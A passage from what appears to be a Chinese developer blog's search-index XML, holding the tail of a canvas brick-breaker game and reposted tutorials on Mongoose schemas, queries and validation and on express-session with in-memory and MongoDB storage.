this.tables[j][i]===1){ this.tables[j][i]= 0; score+= 100; this.yv*=-1; } if(!this.suspend){ this.x= x; this.y= y; this.animID= requestAnim(function () { self.start(newTime); }) } return this; }, clearView: function () { var c= this.c; c.clearRect(0, 0, elWidth, elHeight); }, initBricks: function(){ this.tables= []; for(var i=0; i&lt; col; i++){ this.tables.push([]); for(var j=0; j&lt; row; j++){ this.tables[i][j]= 1; } } }, drawRacket: function () { this.drawRect(this.RL, this.RT, 2*BW, BH, 1, 1); }, drawBall: function(c1, c2){ var c= this.c; c.beginPath(); c.arc(this.x, this.y, r, 0, 2*Math.PI); c.fillStyle= &apos;#000&apos;//randColor(c1 || 150, c2 || 255); c.closePath(); c.fill(); }, drawRect: function(x, y, w, h, c1, c2){ var c= this.c; c.beginPath(); c.fillStyle= randColor(c1 || 0, c2 || 255); c.closePath(); c.fillRect(x, y, w, h); }, drawBricks: function(){ var i= 0,len= this.tables.length, cur, tables= this.tables; for(; i&lt; len; i++){ cur= tables[i]; for(var j= 0; j&lt; cur.length; j++){ cur[j]===1 &amp;&amp; this.drawRect(j*(BW+ BS), i*(BH+ BS), BW, BH); } } }, listenerEvent: function(e){ document.addEventListener(&apos;keydown&apos;, this, false); document.addEventListener(&apos;keyup&apos;, this, false); }, handleEvent: function(e){ var type= e.type, keycode= e.keyCode; if(keycode===37 || keycode=== 39 || keycode=== 32){ switch(type){ case &apos;keydown&apos;: if(keycode === 37) this.downKeyLeft= true; else if(keycode===39) this.downKeyRight = true; break; case &apos;keyup&apos;: if(keycode === 37) this.downKeyLeft= false; else if (keycode===39) this.downKeyRight = false else{ this.suspend= !this.suspend; !this.suspend &amp;&amp; this.start(); } } } }, showText: function(txt, left, top, size){ var c= this.c, tw; size = size || 60; c.beginPath(); c.font= size+ &apos;pt Calibri&apos;; tw= c.measureText(txt).width; left= left=== undefined ? (elWidth- tw)/2 : left; top= top=== undefined ? (elHeight- size)/2 : top; c.fillText(txt, left, top); c.closePath(); }, } return init; }(); b= new Brick(&apos;#zn&apos;); b.start(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 转自：http://www.cnblogs.com/webzhangnan/archive/2013/02/27/2935534.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Mongoose全面理解🐳]]></title>
      <url>%2F2016%2F05%2F28%2F34%2F</url>
      <content type="text"><![CDATA[一、创建schemas创建schemas的方式： var userSchema = new mongoose.Schema({ name: String, email: String, createdOn: Date }); schemas中的数据类型有以下几种： String Number Date Boolean Buffer ObjectId Mixed Array 特别需要说明一下ObjectId类型和Mixed类型以及Array类型，在schemas中声明这几种类型的方式如下： //ObjectId就类似于唯一键值 projectSchema.add({ owner: mongoose.Schema.Types.ObjectId }); //混合类型，顾名思义，就是说里面可以放置任意类型的数据，有两种方式创建该类型数据 //方式一：直接赋予一个空的字面量对象 vardjSchema= new mongoose.Schema({ mixedUp: {} }); //方式二：根据Schemas.Types中值来赋予 vardjSchema= new mongoose.Schema({ mixedUp: Schema.Types.Mixed }); //Array类型数据有两种创建方式，一种是简单数组创建： var userSchema = new mongoose.Schema({ name: String, emailAddresses: [String] }); //第二种方式就是复杂类型数据数组，例如我们可以再数组中添加不同类型的schemas: var emailSchema = new mongoose.Schema({ email: String, verified: Boolean }); var userSchema = new mongoose.Schema({ name: String, emailAddresses: [emailSchema] }); //注意：如果定义一个空的数据的话，则会创建为一个混合类型数据的数组： var emailSchema = new mongoose.Schema({ email: String, verified: Boolean }); var userSchema = new mongoose.Schema({ name: String, emailAddresses: [emailSchema] }); 我们可以给schema创建静态方法，这个静态方法将来会用在Model中，创建该静态方法需要在创建完成schema之后，在Model编译之前： projectSchema.statics.findByUserID = function (userid, callback) { this.find({ createdBy: userid }, &apos;_id projectName&apos;, {sort: &apos;modifiedOn&apos;}, callback); }; 在其对应的模型创建完成并编译后，我们就可以像下面这样来调用该静态方法了：Model.findByUserID(userid,callback);该静态方法会返回一个JSON格式的数据，这在我们使用AJAX技术来加载网页数据的时候会比较方便，就像下面这样： //路由规则：app.get(&apos;/project/byuser/:userid&apos;, project.byUser); exports.byUser = function (req, res) { console.log(&quot;Getting user projects&quot;); if (req.params.userid){ Project.findByUserID(req.params.userid,function (err, projects) { if(!err){ console.log(projects); res.json(projects); }else{ console.log(err); res.json({&quot;status&quot;:&quot;error&quot;, &quot;error&quot;:&quot;Error finding projects&quot;}); } }); }else{ console.log(&quot;No user id supplied&quot;); res.json({&quot;status&quot;:&quot;error&quot;, &quot;error&quot;:&quot;No user id supplied&quot;}); } }; 二、创建Model创建Model很简单：Mongoose.Model(‘User’, userSchema);参数一为Model的名字，参数二为生成Model所需要的schema,Model就像是schema所编译而成的一样。mongoose连接数据库是有两种方式的： //方式一： var dbURI = &apos;mongodb://localhost/mydatabase&apos;; mongoose.connect(dbURI); //方式二： var dbURI = &apos;mongodb://localhost/myadmindatabase&apos;; var adminConnection = mongoose.createConnection(dbURI); //如果需要声明端口号： var dbURI = &apos;mongodb://localhost:27018/mydatabase&apos;; //如果需要定义用户名和密码： var dbURI = &apos;mongodb://username:password@localhost/mydatabase&apos;; //也可以像下面这样传一个对象类型的参数： var dbURI = &apos;mongodb://localhost/mydatabase&apos;; var dbOptions = {&apos;user&apos;:&apos;db_username&apos;,&apos;pass&apos;:&apos;db_password&apos;}; mongoose.connect(dbURI, dbOptions); 根据连接数据库的方式，我们可以得到第二种创建Model的方式，就是使用数据库连接的引用名来创建：adminConnection.model( ‘User’, userSchema );默认情况下mongoose会根据我们传入的Model名字来生成collection名字，在上面的代码中就会生成名为users(全为小写字母)的collection(集合)；有两种方法能让我们自定义collection的名字。 //方式一，在创建schema的时候定义collection的名字： var userSchema = new mongoose.Schema({ name: String, email: {type: String, unique:true} }, { collection: &apos;myuserlist&apos; }); //方式二，在创建Model的时候定义collection的名字： mongoose.model( &apos;User&apos;, userSchema, &apos;myuserlist&apos; ); 创建Model实例：var user = new User({ name: ‘Simon’ });user就是模型User的一个实例，它具有mongoose中模型所具有的一些方法，例如保存实例： user.save(function (err) { if (err) return handleError(err); }); 模型也具有一些常用的增删查改的方法： User.findOne({&apos;name&apos; : &apos;Sally&apos;, function(err,user) { if(!err){ console.log(user); } }); User.find({}, function(err, users) { if(!err){ console.log(users); } }); 可以使用链式方式使用这些方法，例如： var newUser = new User({ name: &apos;Simon Holmes&apos;, email: &apos;simon@theholmesoffice.com&apos;, lastLogin : Date.now() }).save( function( err ){ if(!err){ console.log(&apos;User saved!&apos;); } }); 上面的代码创建了一个模型实例，然后进行保存。我们有一个更为简介的方式来完成这项工作，就是使用Model.create()方法： User.create({ name: &apos;Simon Holmes&apos;, email: &apos;simon@theholmesoffice.com&apos;, lastLogin : Date.now() }, function( err, user ){ if(!err){ console.log(&apos;User saved!&apos;); console.log(&apos;Saved user name: &apos; + user.name); console.log(&apos;_id of saved user: &apos; + user._id); } }); 三、查找数据和读取数据的方法1.使用QueryBuilder接口来查找数据先看看下面的代码： var myQuery = User.find({&apos;name&apos; : &apos;Simon Holmes&apos;}); myQuery.where(&apos;age&apos;).gt(18); myQuery.sort(&apos;-lastLogin&apos;); myQuery.select(&apos;_id name email&apos;); myQuery.exec(function (err, users){ if (!err){ console.log(users); // output array of users found } }); 代码中，我们查找名字为”Simon Holmes”，并且年龄大于18岁，查找结果根据lastLogin降序排列，只获取其中的_id, name, email三个字段的值，上面的代码只有在调用exec方法后才真正执行数据库的查询。当然我们可以使用链式的方式来改写上面的代码，代码会更加简洁： User.find({&apos;name&apos; : &apos;Simon Holmes&apos;}) .where(&apos;age&apos;).gt(18) .sort(&apos;-lastLogin&apos;) .select(&apos;_id name email&apos;) .exec(function (err, users){ if (!err){ console.log(users); // output array of users found } }); 上面代码中的第一行创建了一个queryBuilder.通过使用这个queryBuilder，我们就可以执行一些比较复杂的查找工作，在创建完成这个queryBuilder之后，查询操作并没有马上执行，而是待到执行exec方法时才会去执行数据库的查找。当然也有另外一种方式能够直接查找数据库的，就是直接在查找方法中添加回调函数，使用方式为：Model.find(conditions, [fields], [options], [callback])下面举一个简单例子： User.find({&apos;name&apos;, &apos;simon holmes&apos;}, function(err, user) {}); 另一个稍微复杂的例子： User.find({&apos;name&apos;, &apos;simon holmes&apos;}, &apos;name email&apos;,function(err, user) { //console.log(&apos;some thing&apos;); }); 另一个更加复杂的例子，包含查询结果的排序： User.find({&apos;name&apos; : &apos;Simon Holmes&apos;}, null, // 如果使用null，则会返回所有的字段值 {sort : {lastLogin : -1}}, // 降序排序 function (err, users){ if (!err){console.log(users);} }); 列举几个比较实用的查找方法： Model.find(query); Model.findOne(query);//返回查找到的所有实例的第一个 Model.findById(ObjectID);//根据ObjectId查找到唯一实例 例如： User.findOne({&apos;email&apos; : req.body.Email}, &apos;_id name email&apos;, function(err, user) { //todo }); 2.更新数据有三种方式来更新数据：(1)update(conditions,update,options,callback);该方法会匹配到所查找的内容进行更新，不会返回数据；(2)findOneAndUpdate(conditions,update,options,callback);该方法会根据查找去更新数据库，另外也会返回查找到的并未改变的数据；(3)findByIdAndUpdate(conditions,update,options,callback);该方法跟上面的findOneAndUpdate方法功能一样，不过他是根据ID来查找文档并更新的。三个方法都包含四个参数，一下稍微说明一下几个参数的意思： conditions:查询条件 update:更新的数据对象，是一个包含键值对的对象 options:是一个声明操作类型的选项，这个参数在下面再详细介绍 callback:回调函数 对于options参数，在update方法中和findOneAndUpdate、findByIdAndUpdate两个方法中的可选设置是不同的； //在update方法中，options的可选设置为： { safe:true|false, //声明是否返回错误信息，默认true upsert:false|true, //声明如果查询不到需要更新的数据项，是否需要新插入一条记录，默认false multi:false|true, //声明是否可以同时更新多条记录，默认false strict:true|false //声明更新的数据中是否可以包含在schema定义之外的字段数据，默认true } //对于findOneAndUpdate、findByIdAndUpdate这两个方法，他们的options可选设置项为： { new:true|false, //声明返回的数据时更新后的该是更新前的，如果为true则返回更新后的，默认true upsert:false|trure, sort:javascriptObject, //如果查询返回多个文档记录，则可以进行排序，在这里是根据传入的javascript object对象进行排序 select:String //这里声明要返回的字段，值是一个字符串 } 下面举个例子： User.update({_id:user._id},{$set: {lastLogin: Date.now()}},function(){}); 3.数据删除跟更新数据一样，也有三种方法给我们删除数据： remove(); findOneAndRemove(); findByIdAndRemove(); remove方法有两种使用方式，一种是用在模型上，另一种是用在模型实例上，例如： User.remove({ name : /Simon/ } , function (err){ if (!err){ // 删除名字中包含simon的所有用户 } }); User.findOne({ email : &apos;simon@theholmesoffice.com&apos;},function (err,user){ if (!err){ user.remove( function(err){ // 删除匹配到该邮箱的第一个用户 }); } }); 接下来看一下findOneAndRemove方法： User.findOneAndRemove({name : /Simon/},{sort : &apos;lastLogin&apos;, select : &apos;name email&apos;},function (err, user){ if (!err) { console.log(user.name + &quot; removed&quot;); // Simon Holmes removed }; }); 另外一个findByIdAndRemove方法则是如出一辙的。 User.findByIdAndRemove(req.body._id,function (err, user) { if(err){ console.log(err); return; } console.log(&quot;User deleted:&quot;, user); }); 四、数据验证1.mongoose内置数据验证在mongoose中，数据验证这一层是放在schema中的，mongoose已经帮我们做了很多内置的数据验证，有一些验证是针对某些数据类型的，也有一些是针对所有数据类型的。能够作用在所有数据类型上的验证有require，意思就是该字段是否是必须的，例如 email: { type: String, unique: true, required: true } 上面的代码就定义了一个email是必须的schema下面再分别介绍一下mongoose内置的一些数据验证类型。数字类型schemasType,对于Number类型的数据，具有min,max提供用来界定最大最小值： var teenSchema = new Schema({ age : {type: Number, min: 13, max:19} }); 字符串类型SchemasType,对于该类型数据，mongoose提供了两种验证器： match:可使用正则表达式来匹配字符串是否符合该正则表达式的规则 enum:枚举出字符串可使用的一些值 分别举例如下： var weekdaySchema = new Schema({ day : {type: String, match: /^(mon|tues|wednes|thurs|fri)day$/i} }); var weekdays = [&apos;monday&apos;, &apos;tuesday&apos;, &apos;wednesday&apos;, &apos;thursday&apos;,&apos;friday&apos;]; var weekdaySchema = new Schema({ day : {type: String, enum: weekdays} }); 在我们进行一些数据库的时候，如果有错误，可能会返回一些错误信息，这些信息封装在一个对象中，该对象的数据格式大致如下： { message: &apos;Validation failed&apos;, name: &apos;ValidationError&apos;, errors:{ email:{ message: &apos;Validator &quot;required&quot; failed for path email&apos;, name: &apos;ValidatorError&apos;, path: &apos;email&apos;, type: &apos;required&apos; }, name:{ message: &apos;Validator &quot;required&quot; failed for path name&apos;, name: &apos;ValidatorError&apos;, path: &apos;name&apos;, type: &apos;required&apos; } } } 知道该错误信息的具体格式之后，我们可以从中得出我们想要的信息并反馈到控制台。 if(err){ Object.keys(err.errors).forEach(function(key) { var message = err.errors[key].message; console.log(&apos;Validation error for &quot;%s&quot;: %s&apos;, key, message); }); } 2.自定义数据验证最简单的自定义数据验证方式就是定义一个数据验证的函数，并将它传递给schema; var lengthValidator = function(val) { if (val &amp;&amp; val.length &gt;= 5){ return true; } return false; }; //usage: name: {type: String, required: true, validate: lengthValidator } 可以看到，我们只需要在schema中添加validate键值对即可，validate对应的值便是我们自定义的验证方法；但是该形式的数据验证无法给我们提供完整的错误信息，比如errors信息中返回的type值就会成为undefined;在此基础上如果希望错误信息中能返回一个错误描述，那我们可以稍微进行一点修改： //code 1 validate: { validator: lengthValidator, msg: &apos;Too short&apos; } //code 2 var weekdaySchema = new Schema({ day : {type: String, validate: {validator:/^(mon|tues|wednes|thurs|fri)day$/i, msg: &apos;Not a day&apos; } }); 将validate的值修改为一个对象，并且该对象包含验证器和错误描述。我们也可以使用另一种方式在写这些验证器，就是将验证器卸载schema外部，例如： var validateLength = [lengthValidator, &apos;Too short&apos; ]; var validateDay = [/^(mon|tues|wednes|thurs|fri)day$/i, &apos;Not a day&apos; ]; //usage: name: {type: String, required: true, validate: validateLength } day : {type: String, validate: validateDay } 睛放大，一看再看，确实没错，在validate中我们传入的是一个数组了，而不是原来的对象了。其实就validateLength这个东东来说，他就是一个简写来的，你也可以改成下面这样： var validateLength = [ {validator: lengthValidator, msg: &apos;Too short&apos;} ]; 恩，到这里，应该能明白了，将对象改为数组之后，我们便可以传递多个验证器给我们的schema了，的确如此。 var validateUsername = [ {validator: lengthValidator, msg: &apos;Too short&apos;} , {validator: /^[a-z]+$/i, msg: &apos;Letters only&apos;} ]; 我们还有另外一种方法给我们的schema提供验证器： userSchema.path(&apos;name&apos;).validate(lengthValidator, &apos;Too short&apos;); userSchema.path(&apos;name&apos;).validate(/^[a-z]+$/i, &apos;Letters only&apos;); 转自：http://www.cnblogs.com/jayruan/p/5123754.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[express 框架之session🐾]]></title>
      <url>%2F2016%2F05%2F25%2F33%2F</url>
      <content type="text"><![CDATA[一、什么是session？ 最近在学习node.js 的express框架，接触到了关于session方面的内容。翻阅了一些的博客，学到了不少东西，发现一篇博文讲的很好，概念内容摘抄如下： Session是什么Session一般译作会话，牛津词典对其的解释是进行某活动连续的一段时间。从不同的层面看待session，它有着类似但不全然相同的含义。比如，在web应用的用户看来，他打开浏览器访问一个电子商务网站，登录、并完成购物直到关闭浏览器，这是一个会话。而在web应用的开发者开来，用户登录时我需要创建一个数据结构以存储用户的登录信息，这个结构也叫做session。因此在谈论session的时候要注意上下文环境。而本文谈论的是一种基于HTTP协议的用以增强web应用能力的机制或者说一种方案，它不是单指某种特定的动态页面技术，而这种能力就是保持状态，也可以称作保持会话。 为什么需要session谈及session一般是在web应用的背景之下，我们知道web应用是基于HTTP协议的，而HTTP协议恰恰是一种无状态协议。也就是说，用户从A页面跳转到B页面会重新发送一次HTTP请求，而服务端在返回响应的时候是无法获知该用户在请求B页面之前做了什么的。对于HTTP的无状态性的原因，相关RFC里并没有解释，但联系到HTTP的历史以及应用场景，我们可以推测出一些理由：1.设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。那个时候没有动态页面技术，只有纯粹的静态HTML页面，因此根本不需要协议能保持状态；2.用户在收到响应时，往往要花一些时间来阅读页面，因此如果保持客户端和服务端之间的连接，那么这个连接在大多数的时间里都将是空闲的，这是一种资源的无端浪费。所以HTTP原始的设计是默认短连接，即客户端和服务端完成一次请求和响应之后就断开TCP连接，服务器因此无法预知客户端的下一个动作，它甚至都不知道这个用户会不会再次访问，因此让HTTP协议来维护用户的访问状态也全然没有必要；3.将一部分复杂性转嫁到以HTTP协议为基础的技术之上可以使得HTTP在协议这个层面上显得相对简单，而这种简单也赋予了HTTP更强的扩展能力。事实上，session技术从本质上来讲也是对HTTP协议的一种扩展。总而言之，HTTP的无状态是由其历史使命而决定的。但随着网络技术的蓬勃发展，人们再也不满足于死板乏味的静态HTML，他们希望web应用能动起来，于是客户端出现了脚本和DOM技术，HTML里增加了表单，而服务端出现了CGI等等动态技术。而正是这种web动态化的需求，给HTTP协议提出了一个难题：一个无状态的协议怎样才能关联两次连续的请求呢？也就是说无状态的协议怎样才能满足有状态的需求呢？此时有状态是必然趋势而协议的无状态性也是木已成舟，因此我们需要一些方案来解决这个矛盾，来保持HTTP连接状态，于是出现了cookie和session。对于此部分内容，读者或许会有一些疑问，笔者在此先谈两点： 无状态性和长连接可能有人会问，现在被广泛使用的HTTP1.1默认使用长连接，它还是无状态的吗？连接方式和有无状态是完全没有关系的两回事。因为状态从某种意义上来讲就是数据，而连接方式只是决定了数据的传输方式，而不能决定数据。长连接是随着计算机性能的提高和网络环境的改善所采取的一种合理的性能上的优化，一般情况下，web服务器会对长连接的数量进行限制，以免资源的过度消耗。 无状态性和sessionSession是有状态的，而HTTP协议是无状态的，二者是否矛盾呢？Session和HTTP协议属于不同层面的事物，后者属于ISO七层模型的最高层应用层，前者不属于后者，前者是具体的动态页面技术来实现的，但同时它又是基于后者的。在下文中笔者会分析Servlet/Jsp技术中的session机制，这会使你对此有更深刻的理解。Cookie和Session 上面提到解决HTTP协议自身无状态的方式有cookie和session。二者都能记录状态，前者是将状态数据保存在客户端，后者则保存在服务端。首先看一下cookie的工作原理，这需要有基本的HTTP协议基础。cookie是在RFC2109（已废弃，被RFC2965取代）里初次被描述的，每个客户端最多保持三百个cookie，每个域名下最多20个Cookie（实际上一般浏览器现在都比这个多，如Firefox是50个），而每个cookie的大小为最多4K，不过不同的浏览器都有各自的实现。对于cookie的使用，最重要的就是要控制cookie的大小，不要放入无用的信息，也不要放入过多信息。无论使用何种服务端技术，只要发送回的HTTP响应中包含如下形式的头，则视为服务器要求设置一个cookie： Set-cookie:name=name;expires=date;path=path;domain=domain支持cookie的浏览器都会对此作出反应，即创建cookie文件并保存（也可能是内存cookie），用户以后在每次发出请求时，浏览器都要判断当前所有的cookie中有没有没失效（根据expires属性判断）并且匹配了path属性的cookie信息，如果有的话，会以下面的形式加入到请求头中发回服务端： Cookie: name=&quot;zj&quot;; Path=&quot;/linkage&quot; 服务端的动态脚本会对其进行分析，并做出相应的处理，当然也可以选择直接忽略。这里牵扯到一个规范（或协议）与实现的问题，简单来讲就是规范规定了做成什么样子，那么实现就必须依据规范来做，这样才能互相兼容，但是各个实现所使用的方式却不受约束，也可以在实现了规范的基础上超出规范，这就称之为扩展了。无论哪种浏览器，只要想提供cookie的功能，那就必须依照相应的RFC规范来实现。所以这里服务器只管发Set-cookie头域，这也是HTTP协议无状态性的一种体现。需要注意的是，出于安全性的考虑，cookie可以被浏览器禁用。再看一下session的原理：笔者没有找到相关的RFC，因为session本就不是协议层面的事物。它的基本原理是服务端为每一个session维护一份会话信息数据，而客户端和服务端依靠一个全局唯一的标识来访问会话信息数据。用户访问web应用时，服务端程序决定何时创建session，创建session可以概括为三个步骤： 生成全局唯一标识符（sessionid）； 开辟数据存储空间。一般会在内存中创建相应的数据结构，但这种情况下，系统一旦掉电，所有的会话数据就会丢失，如果是电子商务网站，这种事故会造成严重的后果。不过也可以写到文件里甚至存储在数据库中，这样虽然会增加I/O开销，但session可以实现某种程度的持久化，而且更有利于session的共享； 将session的全局唯一标示符发送给客户端。 问题的关键就在服务端如何发送这个session的唯一标识上。联系到HTTP协议，数据无非可以放到请求行、头域或Body里，基于此，一般来说会有两种常用的方式：cookie和URL重写。 Cookie读者应该想到了，对，服务端只要设置Set-cookie头就可以将session的标识符传送到客户端，而客户端此后的每一次请求都会带上这个标识符，由于cookie可以设置失效时间，所以一般包含session信息的cookie会设置失效时间为0，即浏览器进程有效时间。至于浏览器怎么处理这个0，每个浏览器都有自己的方案，但差别都不会太大（一般体现在新建浏览器窗口的时候）； URL重写所谓URL重写，顾名思义就是重写URL。试想，在返回用户请求的页面之前，将页面内所有的URL后面全部以get参数的方式加上session标识符（或者加在path info部分等等），这样用户在收到响应之后，无论点击哪个链接或提交表单，都会在再带上session的标识符，从而就实现了会话的保持。读者可能会觉得这种做法比较麻烦，确实是这样，但是，如果客户端禁用了cookie的话，URL重写将会是首选。到这里，读者应该明白我前面为什么说session也算作是对HTTP的一种扩展了吧。如下两幅图是笔者在Firefox的Firebug插件中的截图，可以看到，当我第一次访问index.jsp时，响应头里包含了Set-cookie头，而请求头中没有。当我再次刷新页面时，图二显示在响应中不在有Set-cookie头，而在请求头中却有了Cookie头。注意一下Cookie的名字：jsessionid，顾名思义，就是session的标识符，另外可以看到两幅图中的jsessionid的值是相同的，原因笔者就不再多解释了。另外读者可能在一些网站上见过在最后附加了一段形如jsessionid=xxx的URL，这就是采用URL重写来实现的session。（图一，首次请求index.jsp）（图二，再次请求index.jsp）Cookie和session由于实现手段不同，因此也各有优缺点和各自的应用场景： 应用场景Cookie的典型应用场景是Remember Me服务，即用户的账户信息通过cookie的形式保存在客户端，当用户再次请求匹配的URL的时候，账户信息会被传送到服务端，交由相应的程序完成自动登录等功能。当然也可以保存一些客户端信息，比如页面布局以及搜索历史等等。Session的典型应用场景是用户登录某网站之后，将其登录信息放入session，在以后的每次请求中查询相应的登录信息以确保该用户合法。当然还是有购物车等等经典场景； 安全性cookie将信息保存在客户端，如果不进行加密的话，无疑会暴露一些隐私信息，安全性很差，一般情况下敏感信息是经过加密后存储在cookie中，但很容易就会被窃取。而session只会将信息存储在服务端，如果存储在文件或数据库中，也有被窃取的可能，只是可能性比cookie小了太多。Session安全性方面比较突出的是存在会话劫持的问题，这是一种安全威胁，这在下文会进行更详细的说明。总体来讲，session的安全性要高于cookie； 性能Cookie存储在客户端，消耗的是客户端的I/O和内存，而session存储在服务端，消耗的是服务端的资源。但是session对服务器造成的压力比较集中，而cookie很好地分散了资源消耗，就这点来说，cookie是要优于session的； 时效性Cookie可以通过设置有效期使其较长时间内存在于客户端，而session一般只有比较短的有效期（用户主动销毁session或关闭浏览器后引发超时）； 其他Cookie的处理在开发中没有session方便。而且cookie在客户端是有数量和大小的限制的，而session的大小却只以硬件为限制，能存储的数据无疑大了太多。后文中我会主要针对express的session专门讲解。主要参考的博客网址如下，并对博主的无私奉献表示万分感谢。http://www.cnblogs.com/shoru/archive/2010/02/19/1669395.html （大话session）http://blog.csdn.net/fangaoxin/article/details/6952954 （Cookie/Session机制详解）二、express框架之session 内存存储 express-session 是基于express框专门用于处理session的中间件。这里不谈express-session怎么安装，只给出相应的实例代码。另外，session的认证机制离不开cookie，需要同时使用cookieParser 中间件，有关的介绍可以专门参考https://github.com/expressjs/session/blob/master/README.md，或者参考http://blog.modulus.io/nodejs-and-express-sessions，这个博客上讲的比较清楚。 var express = require(&apos;express&apos;); 2 var session = require(&apos;express-session&apos;); 3 var cookieParser = require(&apos;cookie-parser&apos;); 4 5 var app = express(); 6 7 app.use(cookieParser()); 8 app.use(session({ 9 secret: &apos;12345&apos;, 10 name: &apos;testapp&apos;, //这里的name值得是cookie的name，默认cookie的name是：connect.sid 11 cookie: {maxAge: 80000 }, //设置maxAge是80000ms，即80s后session和相应的cookie失效过期 12 resave: false, 13 saveUninitialized: true, 14 })); 15 16 17 app.get(&apos;/awesome&apos;, function(req, res){ 18 19 if(req.session.lastPage) { 20 console.log(&apos;Last page was: &apos; + req.session.lastPage + &quot;.&quot;); 21 } 22 req.session.lastPage = &apos;/awesome&apos;; //每一次访问时，session对象的lastPage会自动的保存或更新内存中的session中去。 23 res.send(&quot;You&apos;re Awesome. And the session expired time is: &quot; + req.session.cookie.maxAge); 24 }); 25 26 app.get(&apos;/radical&apos;, function(req, res){ 27 if (req.session.lastPage) { 28 console.log(&apos;Last page was: &apos; + req.session.lastPage + &quot;.&quot;); 29 } 30 req.session.lastPage = &apos;/radical&apos;; 31 res.send(&apos;What a radical visit! And the session expired time is: &apos; + req.session.cookie.maxAge); 32 }); 33 34 app.get(&apos;/tubular&apos;, function(req, res){ 35 if (req.session.lastPage){ 36 console.log(&quot;Last page was: &quot; + req.session.lastPage + &quot;.&quot;); 37 } 38 39 req.session.lastPage = &apos;/tubular&apos;; 40 res.send(&apos;Are you a suffer? And the session expired time is: &apos; + req.session.cookie.maxAge); 41 }); 42 43 44 app.listen(5000); 2.1 express-session中间件的使用：只需要用express app的use方法将session挂载在‘/’路径即可，这样所有的路由都可以访问到session。可以给要挂载的session传递不同的option参数，来控制session的不同特性。具体可以参见官网：https://github.com/expressjs/session/blob/master/README.md。2.2 session内容的存储和更改： To store or access session data, simply use the request property req.session, which is (generally) serialized as JSON by the store, so nested objects are typically fine. 一旦我们将express-session中间件用use挂载后，我们可以很方便的通过req参数来存储和访问session对象的数据。req.session是一个JSON格式的JavaScript对象，我们可以在使用的过程中随意的增加成员，这些成员会自动的被保存到option参数指定的地方，默认即为内存中去。2.3 session的生命周期session与发送到客户端浏览器的生命周期是一致的。而我们在挂载session的时候，通过option选项的cookie.maxAge成员，我们可以设置session的过期时间，以ms为单位（但是，如果session存储在mongodb中的话，任何低于60s(60000ms)的设置是没有用的，下文会有详细的解释）。如果maxAge不设置，默认为null，这样的expire的时间就是浏览器的关闭时间，即每次关闭浏览器的时候，session都会失效。 三、express框架之session 数据库存储 有时候，我们需要session的声明周期要长一点，比如好多网站有个免密码两周内自动登录的功能。基于这个需求，session必须寻找内存之外的存储载体，数据库能提供完美的解决方案。这里，我选用的是mongodb数据库，作为一个NoSQL数据库，它的基础数据对象时database-collection-document 对象模型非常直观并易于理解，针对node.js 也提供了丰富的驱动和API。express框架提供了针对mongodb的中间件：connect-mongo，我们只需在挂载session的时候在options中传入mongodb的参数即可，程序运行的时候, express app 会自动的替我们管理session的存储，更新和删除。具体可以参考：https://github.com/kcbanner/connect-mongo测试代码如下： var express = require(&apos;express&apos;); var session = require(&apos;express-session&apos;); var cookieParser = require(&apos;cookie-parser&apos;); var MongoStore = require(&apos;connect-mongo&apos;)(session); var app = express(); app.use(cookieParser()); app.use(session({ secret: &apos;12345&apos;, name: &apos;testapp&apos;, cookie: {maxAge: 80000 }, resave: false, saveUninitialized: true, store: new MongoStore({ //创建新的mongodb数据库 host: &apos;localhost&apos;, //数据库的地址，本机的话就是127.0.0.1，也可以是网络主机 port: 27017, //数据库的端口号 db: &apos;test-app&apos; //数据库的名称。 }) })); app.get(&apos;/awesome&apos;, function(req, res){ if(req.session.lastPage) { console.log(&apos;Last page was: &apos; + req.session.lastPage + &quot;.&quot;); } req.session.lastPage = &apos;/awesome&apos;; res.send(&quot;You&apos;re Awesome. And the session expired time is: &quot; + req.session.cookie.maxAge); }); app.get(&apos;/radical&apos;, function(req, res){ if (req.session.lastPage) { console.log(&apos;Last page was: &apos; + req.session.lastPage + &quot;.&quot;); } req.session.lastPage = &apos;/radical&apos;; res.send(&apos;What a radical visit! And the session expired time is: &apos; + req.session.cookie.maxAge); }); app.get(&apos;/tubular&apos;, function(req, res){ if (req.session.lastPage){ console.log(&quot;Last page was: &quot; + req.session.lastPage + &quot;.&quot;); } req.session.lastPage = &apos;/tubular&apos;; res.send(&apos;Are you a suffer? And the session expired time is: &apos; + req.session.cookie.maxAge); }); app.listen(5000); 跟session的内存存储一样，只需增加红色部分的store选项即可，app会自动替我们把session存入到mongodb数据，而非内存中。3.1 session的生命周期：由于session是存在服务器端数据库的，所以的它的生命周期可以持久化，而不仅限于浏览器关闭的时间。具体是由cookie.maxAge 决定：如果maxAge设定是1个小时，那么从这个因浏览器访问服务器导致session创建开始后，session会一直保存在服务器端，即使浏览器关闭，session也会继续存在。如果此时服务器宕机，只要开机后数据库没发生不可逆转的破坏，maxAge时间没过期，那么session是可以继续保持的。当maxAge时间过期后，session会自动的数据库中移除，对应的还有浏览器的cookie。不过，由于connect-mongo的特殊机制（每1分钟检查一次过期session），session的移除可能在时间上会有一定的滞后。 connect-mongo uses MongoDB&apos;s TTL collection feature (2.2+) to have mongod automatically remove expired sessions. (mongod runs this check every minute.) Note: By connect/express&apos;s default, session cookies are set to expire when the user closes their browser (maxAge: null). In accordance with standard industry practices, connect-mongo will set these sessions to expire two weeks from their last &apos;set&apos;. You can override this behavior by manually setting the maxAge for your cookies -- just keep in mind that any value less than 60 seconds is pointless, as mongod will only delete expired documents in a TTL collection every minute. 当然，由于cookie是由浏览器厂商实现的，cookie不具有跨浏览器的特性，例如，我用firefox浏览器在京东上购物时，勾选了2周内免密码输入，但是当我第一次用IE登陆京东时，同样要重新输入密码。所以，这对服务器的同一个操作，不同的浏览器发起的请求，会产生不同的session-cookie。 转自：http://www.cnblogs.com/chenchenluo/p/4197181.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Node模块创建及使用，文件操作，IO交互，URL解析🌼]]></title>
      <url>%2F2016%2F05%2F24%2F32%2F</url>
